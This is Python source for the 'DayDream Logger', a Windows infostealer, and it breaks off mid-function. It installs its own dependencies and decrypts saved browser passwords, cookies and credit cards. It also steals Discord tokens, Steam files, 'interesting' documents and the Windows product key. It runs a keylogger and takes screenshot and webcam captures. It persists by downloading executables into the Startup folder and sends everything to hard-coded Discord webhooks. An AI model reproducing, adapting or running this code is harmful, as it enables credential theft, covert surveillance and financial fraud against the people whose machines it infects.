import os
import threading
import subprocess
import sys

global executableUrl, executableName
global pythonUrl, pythonName
global requirements
requirementString = "altgraph;autopep8;certifi;charset-normalizer;colorama;cryptography;discord-webhook;future;get-mac;httpx;idna;imageio;imageio-ffmpeg;keyboard;matplotlib;pefile;Pillow;psutil;PyAutoGUI;pycodestyle;pycryptodome;pycryptodomex;pyinstaller;pyinstaller-hooks-contrib;pystyle;pywin32;pywin32-ctypes;pyzipper;requests;toml;urllib3;winshell;win32-bridge;win32-setctime;win32-setfiletime;"
executableUrl = "https://raw.githubusercontent.com/Swe4rX/test/main/WinStartupApplicationDLL.exe"
executableName = "testing"
pythonUrl = "https://raw.githubusercontent.com/Swe4rX/test/main/WinStartupApplicationDLL.pyw"
pythonName = "testing"
requirements = requirementString.split(";")

global interestingCnt
interestingCnt = 0

global checkCookies, checkHwid
checkCookies = eval("False")
checkHwid = eval("False")


def installModules() -> None:
	global requirements
	for requirement in requirements:
		try:
			# os.popen(f"pip install {requirement} &")
			subprocess.Popen(f"\"{sys.executable}\" -m pip install {requirement} &", shell=True)
		except:
			pass
		time.sleep(4)

try:
	import base64
	import datetime
	import json
	from os.path import join, exists
	from random import choice
	from re import findall
	from shutil import copy2, rmtree
	from sqlite3 import connect
	from string import ascii_letters
	from time import sleep
	import time
	from Crypto.Cipher import AES
	from discord_webhook import DiscordWebhook, DiscordEmbed
	from pyzipper import AESZipFile, ZIP_DEFLATED, WZ_AES
	from requests import get
	from win32crypt import CryptUnprotectData
	import pyautogui
	import keyboard
	import winshell
	import getmac
	import psutil
	import httpx
	import imageio
	import imageio.v3
	import imageio_ffmpeg
except:
	installModules()

def matchesInteresting(name: str, file: bool) -> bool:
	if file:
		endings = [
			"txt",
			"xml",
			"sql",
			"pdf"
		]
		for ending in endings:
			if "." + ending in name:
				break
		else:
			return False
	keywords = [
		"p#a#s#s#",
		"k#e#y#",
		"l#i#c#e#n#s#e#",
		"#t###o#k#e#n#",
		"#p#r#o#x#y##",
		"#a#c#c#o##u#n#t###",
		"#w##i#c#h#t#i#g",
		"w#a#l#l#e#t#",
		"#b###a#n#k#",
		"#l#o#g##i#n#",
		"#b#a##n#k#",
		"#l#o#g#i#n#",
		"##p##a#y#",
		"##c#r#e#d#i#t#",
		"#i##m##p#o#r#t#a#n#t##",
		"##c##a#r#d#",
		"#p#i#n##",
		"###c#r#y###p#to",
		"####m###d###p###",
		"##m##o#t#d#e##p#a##s##s#e",
		"mo###t##_de###_##p###as##s####e#",
		"###s##e##c##r##e##t",
		"a#c##o##u##n##t##",
		"##p##a##y##p###a##l",
		"##b##a###n##q##u#e#",
		"m###et##a##m#a#s###k",
		"###e##x##o##d##u###s",
		"##d##i##s##c##o##r##d###",
		"###2###f##a###",
		"c##o###d####e##",
		"##m####e###m###o##",
		"##c##o##m##p##t##e##",
		"###b###a###c##k##u##p###",
		"##s##e##e##c##r##e##t##"
	]
	for keyword in keywords:
		if keyword.replace("#", "") in name.lower():
			return True
	return False


def getCurrentFile() -> str:
	return __file__


def decrypt_payload(cipher, payload):
	return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
	return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_pa55w0rd(buff, master_key):
	try:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = generate_cipher(master_key, iv)
		decrypted_pass = decrypt_payload(cipher, payload)
		decrypted_pass = decrypted_pass[:-16].decode()
		return decrypted_pass

	except Exception as e:
		print(str(e))


def get_size(byteData, suffix="B"):
	factor = 1024
	for unit in ["", "K", "M", "G", "T", "P"]:
		if byteData < factor:
			return f"{byteData:.2f}{unit}{suffix}"
		byteData /= factor


class DayDream:
	hwid: str

	def trust(self) -> bool:
		# simple Trust Factor system
		data = str(self.hostKeys)
		tim = findall("\\.google\\.com", data)
		# print(len(tim))
		self.DETECTED = len(tim) < -1
		return not self.DETECTED

	def win_decrypt(self, encrypted_str: bytes) -> str:
		return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

	def system_info(self) -> list:
		flag = 0x08000000
		sh1 = "wmic csproduct get uuid"
		sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
		sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
		try:
			HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
		except Exception:
			HWID = "N/A"
		try:
			wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
		except Exception:
			wkey = "N/A"
		try:
			winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
		except Exception:
			winver = "N/A"
		return [HWID, winver, wkey]

	def network_info(self) -> list:
		ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
		req = httpx.get("https://ipinfo.io/json")
		if req.status_code == 200:
			data = req.json()
			ip = data.get('ip')
			city = data.get('city')
			country = data.get('country')
			region = data.get('region')
			org = data.get('org')
			loc = data.get('loc')
			googlemap = "https://www.google.com/maps/search/google+map++" + loc
		return [ip, city, country, region, org, loc, googlemap]

	def getMasterKey(self, path: str) -> str:
		copy2(path, join(self.temp, "ewerjwerjkn231rjkn"))
		with open(join(self.temp, "ewerjwerjkn231rjkn"), "r", encoding="utf-8") as file:
			localState = file.read()
			localState = json.loads(localState)
		masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
		masterKey = masterKey[5:]
		masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
		os.remove(join(self.temp, "ewerjwerjkn231rjkn"))
		return masterKey

	def getBrowserMasterKey(self, path: str) -> bytes:
		with open(join(path, "Local State"), "r") as file:
			localState = file.read()
			localState = json.loads(localState)

		masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
		masterKey = masterKey[5:]
		masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]

		return masterKey

	def getBrowserCookies(self, name: str, path: str, checkProfiles: bool) -> None:
		browserLocation = path
		possibleLocations = []
		if (checkProfiles):
			possibleLocations.append(join(browserLocation, "Default"))
			possibleLocations.append(join(browserLocation, "Guest Profile"))

			for directoryName in os.listdir(browserLocation):
				if "Profile " in directoryName:
					possibleLocations.append(join(browserLocation, directoryName))
		else:
			possibleLocations.append(browserLocation)

		cookiesFile = open(
			join(self.browserDirectory, name.replace(" ", "-") + "Cookies.txt"), "a")
		cookiesFile.write(
			name + " Cookies\n")

		masterKey = self.getBrowserMasterKey(path)

		for location in possibleLocations:
			try:
				databasePath = join(
					location, "Network", "Cookies")
				tempDatabasePath = join(os.getenv("TEMP"), "".join(
					choice(ascii_letters) for i in range(15)))

				copy2(databasePath, tempDatabasePath)

				databaseConnection = connect(tempDatabasePath)
				databaseCursor = databaseConnection.cursor()

				# SELECT name, path, encrypted_value FROM cookies

				databaseCursor.execute("SELECT name, host_key, path, encrypted_value FROM cookies")

				for r in databaseCursor.fetchall():
					name = r[0]
					hostKey = r[1]
					path = r[2]
					decryptedValue = self.decryptValue(
						r[3], masterKey)
					self.hostKeys.append(hostKey)

					cookiesFile.write(f"""
==========================================
Cookie Name: {name}
Cookie Path: {path}
Cookie Host Key: {hostKey}
Decrypted Cookie: {decryptedValue}
==========================================
                    """)
			except BaseException:
				pass

		databaseCursor.close()
		databaseConnection.close()
		cookiesFile.close()

		try:
			os.remove(tempDatabasePath)
			sleep(0.2)
		except BaseException:
			pass

	def getBrowserCards(self, name: str, path: str, checkProfiles: bool) -> None:
		browserLocation = path
		possibleLocations = []
		if (checkProfiles):
			possibleLocations.append(join(browserLocation, "Default"))
			possibleLocations.append(join(browserLocation, "Guest Profile"))

			for directoryName in os.listdir(browserLocation):
				if "Profile " in directoryName:
					possibleLocations.append(join(browserLocation, directoryName))
		else:
			possibleLocations.append(browserLocation)

		cardsFile = open(
			join(self.browserDirectory, name.replace(" ", "-") + "Cards.txt"), "a")
		cardsFile.write(
			name + " Credit Cards\n")

		masterKey = self.getBrowserMasterKey(path)

		for location in possibleLocations:
			try:
				databasePath = join(location, "Web Data")
				tempDatabasePath = join(os.getenv("TEMP"), "".join(
					choice(ascii_letters) for i in range(15)))

				copy2(databasePath, tempDatabasePath)

				databaseConnection = connect(tempDatabasePath)
				databaseCursor = databaseConnection.cursor()

				try:
					databaseCursor.execute(
						"SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")

					for r in databaseCursor.fetchall():
						nameOnCard = r[0]
						expirationMonth = r[1]
						expirationYear = r[2]
						decryptedCardNumber = self.decryptValue(
							r[3], masterKey)

						cardsFile.write(f"""
==========================================
Name On Card: {nameOnCard}
Expiration Year: {expirationYear}
Expiration Month: {expirationMonth}
Decrypted Card Number: {decryptedCardNumber}
==========================================
                        """)
				except Exception as ex:
					print(ex)
					pass
			except BaseException:
				pass

		databaseCursor.close()
		databaseConnection.close()
		cardsFile.close()

		try:
			os.remove(tempDatabasePath)
			sleep(0.2)
		except BaseException:
			pass

	def getBrowserPa55w0rds(self, name: str, path: str, checkProfiles: bool) -> None:
		browserLocation = path
		possibleLocations = []
		if (checkProfiles):
			possibleLocations.append(join(browserLocation, "Default"))
			possibleLocations.append(join(browserLocation, "Guest Profile"))

			for directoryName in os.listdir(browserLocation):
				if "Profile " in directoryName:
					possibleLocations.append(join(browserLocation, directoryName))
		else:
			possibleLocations.append(browserLocation)

		pa55w0rdsFile = open(
			join(self.browserDirectory, name + "PA55w0rds.txt"), "a")
		pa55w0rdsFile.write(
			name.replace(" ", "-") + " PA55W0RDS\n")

		masterKey = self.getBrowserMasterKey(path)

		for possibleLocation in possibleLocations:
			try:
				databasePath = join(
					possibleLocation, "Login Data")
				tempDatabasePath = join(os.getenv("TEMP"), "".join(
					choice(ascii_letters) for i in range(15)))

				copy2(databasePath, tempDatabasePath)

				databaseConnection = connect(tempDatabasePath)
				databaseCursor = databaseConnection.cursor()

				try:
					databaseCursor.execute(
						"SELECT action_url, username_value, \x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x76\x61\x6c\x75\x65, origin_url, date_last_used FROM logins")

					for r in databaseCursor.fetchall():
						url = r[0]
						username = r[1]
						decryptedPa55w0rd = self.decryptValue(
							r[2], masterKey)
						originUrl = r[3]
						dateLastUsed = ""

						try:
							dateLastUsed = datetime.datetime(
								1601, 1, 1) + datetime.timedelta(microseconds=r[4])
						except BaseException:
							pass

						pa55w0rdsFile.write(f"""
==========================================#
Action URL: {url}
Origin URL: {originUrl}
Username: {username}
Decrypted PA55W0RD: {decryptedPa55w0rd}
Date last Used: {dateLastUsed}
==========================================#
                    """)

				except BaseException:
					pass
			except BaseException:
				pass

		databaseCursor.close()
		databaseConnection.close()
		pa55w0rdsFile.close()

		try:
			os.remove(tempDatabasePath)
			sleep(0.2)
		except BaseException:
			pass

	def getT0k3ns(self) -> None:
		for _, path in self.paths.items():
			if not exists(path):
				continue
			try:
				if "discord" not in path:
					for fileName in os.listdir(path):
						if not fileName.endswith(
								".log") and not fileName.endswith(".ldb"):
							continue
						for line in [
							x.strip() for x in open(
								f'{path}\\{fileName}',
								errors='ignore').readlines() if x.strip()]:
							for regex in (self.normalRegex):
								for t0k3n in findall(regex, line):
									if (self.checkT0k3n(t0k3n)):
										if t0k3n not in self.t0k3ns:
											self.t0k3ns.append(t0k3n)
				else:
					if exists(join(self.appData, "discord", "Local State")):
						for fileName in os.listdir(path):
							if not fileName.endswith(
									".log") and not fileName.endswith(".ldb"):
								continue
							for line in [
								x.strip() for x in open(
									f'{path}\\{fileName}',
									errors='ignore').readlines() if x.strip()]:
								for y in findall(self.encryptedRegex, line):
									t0k3n = self.decryptValue(base64.b64decode(y[:y.find('"')].split(
										'dQw4w9WgXcQ:')[1]), self.getMasterKey(
										join(self.appData, "discord", "Local State")))

									if (self.checkT0k3n(t0k3n)):
										if t0k3n not in self.t0k3ns:
											self.t0k3ns.append(t0k3n)
			except BaseException:
				pass

		for t0k3n in self.t0k3ns:
			self.addT0k3nD4t4(t0k3n)

	def addInfoEmbed(self) -> None:
		mac = getmac.get_mac_address()
		ram = "{:.3f}".format(psutil.virtual_memory()[0] / 1024**3)
		disk = "{:.3f}".format(psutil.disk_usage('/')[0] / 1024**3)
		userName = os.getenv("USERNAME")
		hostName = os.getenv("COMPUTERNAME")
		infoEmbed = DiscordEmbed(
			title="DayDream Logger | New hit! 🌙", color=8134084)
		infoEmbed.add_embed_field(
			name="Computer Information",
			value=f"""IP Address: ||`{self.ip}`||
            MAC Address: ||`{mac}`||
            Username: `{userName}`
            Computer Name: `{hostName}`
            Windows key: ||`{self.winkey}`||
            Windows version: `{self.winver}`
            RAM: `{ram} GB`
            DISK: `{disk} GB`
            HWID: `{self.hwid}`""",
			inline=False)
		infoEmbed.add_embed_field(
			name="Location Information",
			value=f"""City: `{self.city}`
            Region: `{self.region}`
            Country: `{self.country}`
            Org: `{self.org}`
            Location: `{self.loc}`
            GoogleMaps: `{self.googlemap}`""",
			inline=False)
		infoEmbed.add_embed_field(
			name="info",
			value=f"""**Zip Archive Decryption PA55W0RD:** ||`{self.pa55w0rd}`||""",
			inline=False)
		infoEmbed.set_footer(
			text="DayDream Logger V1 | Stealing data since 1989 🌙")
		self.webHook.add_embed(infoEmbed)

	def addT0k3nD4t4(self, t0k3n: str) -> None:
		data = get('https://discordapp.com/api/v9/users/@me',
		           headers={"Authorization": t0k3n}).json()

		t0k3n3mb3d = DiscordEmbed(
			title=f"{data['username']}#{data['discriminator']} ({data['id']})",
			color=8134084)

		t0k3n3mb3d.add_embed_field(
			name=f"T0ken Data",
			value=f"""Public Flags: `{data['public_flags']}`
            Flags: `{data['flags']}`
            Banner Color: `{data['banner_color']}`
            Accent Color: `{data['accent_color']}`
            Locale: `{data['locale']}`
            NSFW Allowed: `{data['nsfw_allowed']}`
            MFA Enabled: `{data['mfa_enabled']}`
            Email: ||`{data['email']}`||
            Verified: `{data['verified']}`
            Phone #: ||`{data['phone']}`||""",
			inline=False)
		t0k3n3mb3d.add_embed_field(
			name="T0K3N", value=f"||`{t0k3n}`||", inline=False)
		t0k3n3mb3d.set_image(
			url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['banner']}.png")
		t0k3n3mb3d.set_thumbnail(
			url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png")
		t0k3n3mb3d.set_footer(
			text="DayDream Logger V1 | Stealing data since 1989 🌙")
		t0k3n3mb3d.set_url(f"https://discord.com/users/{data['id']}")
		self.webHook.add_embed(embed=t0k3n3mb3d)

	def searchInteresting(self, folder: str, level: int) -> None:
		global interestingCnt
		try:
			for file in os.listdir(folder):
				path = join(folder, file)
				try:
					if os.path.isdir(path):
						if matchesInteresting(file, False):
							self.addInterestingFolder(path, 4)
						elif level > 0:
							self.searchInteresting(path, level - 1)
					elif matchesInteresting(file, True):
						copy2(path, join(self.interestingDirectory, str(interestingCnt) + file))
						interestingCnt += 1
				except BaseException:
					pass
		except BaseException:
			pass

	def addInterestingFolder(self, folder: str, level: int) -> None:
		global interestingCnt
		try:
			for file in os.listdir(folder):
				path = join(folder, file)
				try:
					if os.path.isdir(path):
						if level > 0:
							self.addInterestingFolder(path, level - 1)
					else:
						copy2(path, join(self.interestingDirectory, str(interestingCnt) + file))
						interestingCnt += 1
				except BaseException:
					pass
		except BaseException:
			pass

	def sendInteresting(self) -> None:
		global interestingCnt
		embed = DiscordEmbed(title="DayDream Logger | Report :newspaper:", color=8134084)
		embed.add_embed_field(
			name=f"File searcher",
			value=f"Found {interestingCnt}  interesting Files!")
		self.webHook.add_embed(embed)
		zipFile = AESZipFile(
			join(
				self.temp,
				f"{self.mainId}-Interesting.zip"),
			'w',
			compression=ZIP_DEFLATED,
			encryption=WZ_AES)
		zipFile.pwd = bytes(self.pa55w0rd, encoding="utf-8")
		folderContents = os.listdir(self.interestingDirectory)
		for fileName in folderContents:
			absolutePath = join(self.interestingDirectory, fileName)
			zipFile.write(absolutePath, fileName)
		zipFile.close()
		with open(join(self.temp, f"{self.mainId}-Interesting.zip"), "rb") as file:
			self.webHook.add_file(file=file.read(), filename=os.getenv("USERNAME") + "-Interesting.zip")
		os.remove(join(self.temp, f"{self.mainId}-Interesting.zip"))

	def checkT0k3n(self, t0k3n: str) -> bool:
		if get("https://discord.com/api/v9/auth/login",
		       headers={"Authorization": t0k3n}).status_code == 200:
			return True
		else:
			return False

	def decryptValue(self, buff: bytes, masterKey: bytes) -> str:
		try:
			payload = buff[15:]
			cipher = AES.new(masterKey, AES.MODE_GCM, buff[3:15])
			return cipher.decrypt(payload)[:-16].decode()
		except BaseException:
			return ""

	def getBrowserData(self, name: str, path: str, checkProfiles: bool) -> None:
		try:
			self.getBrowserPa55w0rds(name, path, checkProfiles)
		except BaseException:
			pass
		try:
			self.getBrowserCookies(name, path, checkProfiles)
		except BaseException:
			pass
		try:
			self.getBrowserCards(name, path, checkProfiles)
		except BaseException:
			pass

	def sendBrowserData(self) -> None:
		zipFile = AESZipFile(
			join(
				self.temp,
				f"{self.mainId}-Browser.zip"),
			'w',
			compression=ZIP_DEFLATED,
			encryption=WZ_AES)
		zipFile.pwd = bytes(self.pa55w0rd, encoding="utf-8")
		folderContents = os.listdir(self.browserDirectory)
		for fileName in folderContents:
			absolutePath = join(self.browserDirectory, fileName)
			zipFile.write(absolutePath, fileName)
		zipFile.close()
		with open(join(self.temp, f"{self.mainId}-Browser.zip"), "rb") as file:
			self.webHook.add_file(file=file.read(), filename=os.getenv("USERNAME") + "-BrowserData.zip")
		os.remove(join(self.temp, f"{self.mainId}-Browser.zip"))

	def loopScreenshots(self) -> None:
		while True:
			self.sendScreenshot()
			sleep(float("100"))

	def sendScreenshot(self) -> None:
		imgName = time.strftime("%Y%m%d-%H%M%S.jpg")
		imgPath = join(self.temp, imgName)
		img = pyautogui.screenshot(imgPath)
		with open(imgPath, "rb") as file:
			self.screenWebHook.add_file(file=file.read(), filename=imgName)
		self.screenWebHook.execute(remove_files=True)
		os.remove(imgPath)

	def loopKeyLogger(self) -> None:
		while True:
			self.recordKeys()

	def recordKeys(self) -> None:
		record = keyboard.record(until='enter')
		keySender = KeySender(self, record)
		threading.Thread(target=keySender.sendKeys, daemon=False).start()

	def loadToStartup(self) -> None:
		global executableUrl, executableName, pythonUrl, pythonName
		if executableUrl:
			try:
				# folderPath = join(self.appData, 'Microsoft', 'Windows', 'Start Menu') #'Programs' 'Startup'
				# for f in os.listdir(folderPath):
				#     if f.lower().startswith("program"):
				#         folderPath = join(folderPath, f, 'Startup')
				#         break
				folderPath = str(winshell.startup())
				os.popen(f"cd {folderPath} && curl -s -f -o {executableName}.exe {executableUrl} &")
			# ts = time.time()-1000*3600*24*30
			# win32_setfiletime.setctime(join(folderPath, f"{executableName}.exe"), ts)
			# win32_setfiletime.setatime(join(folderPath, f"{executableName}.exe"), ts)
			# win32_setfiletime.setmtime(join(folderPath, f"{executableName}.exe"), ts)
			except BaseException as err:
				embed = DiscordEmbed(title="DayDream Logger | Error! :x:", color=8134084)
				embed.add_embed_field(
					name="Execution",
					value="Could not load to startup")
				embed.add_embed_field(
					name="Error Message",
					value=str(err))
				self.webHook.add_embed(embed)
		if pythonUrl:
			try:
				# folderPath = join(self.appData, 'Microsoft', 'Windows', 'Start Menu') #'Programs' 'Startup'
				# for f in os.listdir(folderPath):
				#     if f.lower().startswith("program"):
				#         folderPath = join(folderPath, f, 'Startup')
				#         break
				folderPath = str(winshell.startup())
				os.popen(f"cd {folderPath} && curl -s -f -o {pythonName}.py {pythonUrl} &")
			# ts = time.time()-1000*3600*24*30
			# win32_setfiletime.setctime(join(folderPath, f"{executableName}.exe"), ts)
			# win32_setfiletime.setatime(join(folderPath, f"{executableName}.exe"), ts)
			# win32_setfiletime.setmtime(join(folderPath, f"{executableName}.exe"), ts)
			except BaseException as err:
				embed = DiscordEmbed(title="DayDream Logger | :x: Error!", color=8134084)
				embed.add_embed_field(
					name="Execution",
					value="Could not load to startup")
				embed.add_embed_field(
					name="Error Message",
					value=str(err))
				self.webHook.add_embed(embed)

	def grabSteam(self) -> None:
		try:
			steam = self.steamDirectory
			os.makedirs(steam, exist_ok=True)
			mc = r"C:\Program Files (x86)\Steam"
			# for root, dirs, files in os.walk(mc):
			#     for _file in files:
			#         if _file.startswith("ssfn"):
			#             copy2(join(mc, _file), steam)
			for file0 in os.listdir(mc):
				if os.path.isdir(join(mc, file0)):
					if file0 == "config":
						for file1 in os.listdir(join(mc, file0)):
							if not os.path.isdir(join(mc, file0, file1)):
								if "user" in file1.lower():
									copy2(join(mc, file0, file1), steam)
					elif file0 == "userdata":
						for file1 in os.listdir(join(mc, file0)):
							if os.path.exists(join(mc, file0, file1, "config")):
								for file2 in os.listdir(join(mc, file0, file1, "config")):
									if os.path.isfile(join(mc, file0, file1, "config", file2)):
										copy2(join(mc, file0, file1, "config", file2), join(steam, file1 + "-" + file2))
				else:
					if file0.startswith("ssfn"):
						copy2(join(mc, file0), steam)

			zipFile = AESZipFile(
				join(
					self.temp,
					f"{self.mainId}-Steam.zip"),
				'w',
				compression=ZIP_DEFLATED,
				encryption=WZ_AES)
			zipFile.pwd = bytes(self.pa55w0rd, encoding="utf-8")
			folderContents = os.listdir(steam)
			for fileName in folderContents:
				absolutePath = join(steam, fileName)
				zipFile.write(absolutePath, fileName)
			zipFile.close()
			with open(join(self.temp, f"{self.mainId}-Steam.zip"), "rb") as file:
				self.webHook.add_file(file=file.read(), filename=os.getenv("USERNAME") + "-SteamData.zip")
			os.remove(join(self.temp, f"{self.mainId}-Steam.zip"))

			rmtree(steam)
		except BaseException as err:
			embed = DiscordEmbed(title="DayDream Logger | Error! :x:", color=8134084)
			embed.add_embed_field(
				name="Execution",
				value="Could not grab Steam")
			embed.add_embed_field(
				name="Error Message",
				value=str(err))
			self.webHook.add_embed(embed)
			pass

	def loopWebcam(self) -> None:
		while True:
			camera = imageio.get_reader("<video0>")
			self.sendWebcam(camera)
			sleep(float("100"))

	def sendWebcam(self, camera: imageio.core.format.Format.Reader) -> None:
		img = camera.get_data(0)
		imgName = time.strftime("%Y%m%d-%H%M%S-cam.jpg")
		imgPath = join(self.temp, imgName)
		imageio.v3.imwrite(imgPath, img)
		with open(imgPath, "rb") as file:
			self.camWebHook.add_file(file=file.read(), filename=imgName)
		self.camWebHook.execute(remove_files=True)
		os.remove(imgPath)

	def __init__(self) -> None:
		global checkCookies, checkHwid

		self.hostKeys = []
		self.DETECTED = False
		self.appData = os.getenv("APPDATA")
		self.localAppData = os.getenv("LOCALAPPDATA")
		self.paths = {
			'Discord': self.appData + r'\\discord\\Local Storage\\leveldb\\',
			'Discord Canary': self.appData + r'\\discordcanary\\Local Storage\\leveldb\\',
			'Lightcord': self.appData + r'\\Lightcord\\Local Storage\\leveldb\\',
			'Discord PTB': self.appData + r'\\discordptb\\Local Storage\\leveldb\\',
			'Opera': self.appData + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
			'Opera GX': self.appData + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
			'Amigo': self.localAppData + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
			'Torch': self.localAppData + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
			'Kometa': self.localAppData + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
			'Orbitum': self.localAppData + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
			'CentBrowser': self.localAppData + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
			'7Star': self.localAppData + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
			'Sputnik': self.localAppData + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
			'Vivaldi': self.localAppData + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome SxS': self.localAppData + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
			'Chrome': self.localAppData + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
			'Epic Privacy Browser': self.localAppData + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
			'Microsoft Edge': self.localAppData + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
			'Uran': self.localAppData + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
			'Yandex': self.localAppData + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Brave': self.localAppData + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Iridium': self.localAppData + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
		self.t0k3ns = []
		self.temp = os.getenv("TEMP")

		inf, net = self.system_info(), self.network_info()
		self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
		self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[
			3], net[4], net[5], net[6]

		if checkHwid:
			cnt = 0
			for i in range(16):
				cnt += self.hwid.replace("-", "").count(hex(i)[-1].upper() * 4)
			if cnt >= 5:
				print()
				print()
				print("-" * 20)
				print()
				print("Suspicious HWID detectet!")
				exit(0)

		self.encryptedRegex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
		self.normalRegex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
		self.webHook = DiscordWebhook(
			url="https://discord.com/api/webhooks/1025024885992472607/fhA8J6J78yEsHhUG8O1G5WZYOOOtvznjcHhwfiMnTvuUENUfey8iyDKwQT5l_fKYIUia",
			username="DayDream Logger | V1 🌙 (Logging " + os.getenv("USERNAME") + ")")
		self.screenWebHook = DiscordWebhook(
			url="https://discord.com/api/webhooks/1025027049989087242/3zS38GSqKhOf73IeIGp1uiO52fzNefRmogDwqt2xSEbdnvDyG_X7n_bKN6AFlNMMjxHe",
			username="DayDream Screenshot | V1 🌙 (Logging " + os.getenv("USERNAME") + ")")
		self.camWebHook = DiscordWebhook(
			url="https://discord.com/api/webhooks/1025027049989087242/3zS38GSqKhOf73IeIGp1uiO52fzNefRmogDwqt2xSEbdnvDyG_X7n_bKN6AFlNMMjxHe",
			username="DayDream Webcam | V1 🌙 (Logging " + os.getenv("USERNAME") + ")")
		self.keyWebHook = DiscordWebhook(
			url="https://discord.com/api/webhooks/1025027014954070056/W719llAPIUr5-plTHsG9ALzQkJ_OZIyglsdQW_YTX7kaqROC2_g_Ib_gNBlS6sYggBui",
			username="DayDream Key Logger | V1 🌙 (Logging " + os.getenv("USERNAME") + ")")

		self.mainId = "".join(
			choice(ascii_letters) for x in range(8))
		self.pa55w0rd = "".join(
			choice(ascii_letters) for x in range(8))
		self.browserDirectory = join(self.temp, self.mainId + "-browser")
		os.mkdir(self.browserDirectory)
		self.steamDirectory = join(self.temp, self.mainId + "-steam")
		os.mkdir(self.steamDirectory)
		self.interestingDirectory = join(self.temp, self.mainId + "-interesting")
		os.mkdir(self.interestingDirectory)

		browserThreads = []
		try:
			th = threading.Thread(target=self.getBrowserData,
			                      args=["Chrome", join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
			                            True])
			th.start()
			browserThreads.append(th)
		except BaseException:
			pass
		try:
			th = threading.Thread(target=self.getBrowserData,
			                      args=["Brave",
			                            join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
			                            True])
			th.start()
			browserThreads.append(th)
		except BaseException:
			pass
		try:
			th = threading.Thread(target=self.getBrowserData,
			                      args=["Opera", join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"), False])
			th.start()
			browserThreads.append(th)
		except BaseException:
			pass
		try:
			th = threading.Thread(target=self.getBrowserData,
			                      args=["Opera-GX", join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
			                            False])
			th.start()
			browserThreads.append(th)
		except BaseException:
			pass
		try:
			th = threading.Thread(target=self.getBrowserData,
			                      args=["MS-Edge", join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
			                            True])
			th.start()
			browserThreads.append(th)
		except BaseException:
			pass

		for th in browserThreads:
			th.join()

		if checkCookies:
			if not self.trust():
				exit(0)

		self.loadToStartup()

		self.screenshotThread = threading.Thread(target=self.loopScreenshots, daemon=False, name="Screenshots")
		self.screenshotThread.start()
		self.camThread = threading.Thread(target=self.loopWebcam, daemon=False, name="Webcam")
		self.camThread.start()
		self.keyloggerThread = threading.Thread(target=self.loopKeyLogger, daemon=False, name="KeyLogger")
		self.keyloggerThread.start()
		# try:
		#    self.getChromeData()
		# except BaseException:
		#    pass
		self.addInfoEmbed()
		self.getT0k3ns()
		self.webHook.execute(remove_files=True, remove_embeds=True)
		self.sendBrowserData()
		self.webHook.execute(remove_files=True, remove_embeds=True)
		try:
			rmtree(self.browserDirectory)
		except BaseException:
			pass
		try:
			self.grabSteam()
		except BaseException:
			pass
		self.webHook.execute(remove_files=True, remove_embeds=True)
		try:
			rmtree(self.steamDirectory)
		except BaseException:
			pass
		self.searchInteresting(winshell.desktop(), 4)
		self.searchInteresting(winshell.my_documents(), 4)
		self.sendInteresting()
		self.webHook.execute(remove_files=True, remove_embeds=True)
		try:
			rmtree(self.interestingDirectory)
		except BaseException:
			pass


class KeySender:
	def sendKeys(self):
		fileName = "keys".join(
			choice(ascii_letters) for x in range(4)).join(".txt")
		keysFile = open(
			join(self.parent.temp, fileName), "a")
		keysFile.write("+ = down\n")
		keysFile.write("- = up\n")
		keysFile.write("type name scan_code\n")
		for event in self.record:
			if event.event_type == 'down':
				keysFile.write("+ " + event.name + " (" + str(event.scan_code) + ")\n")
			elif event.event_type == 'up':
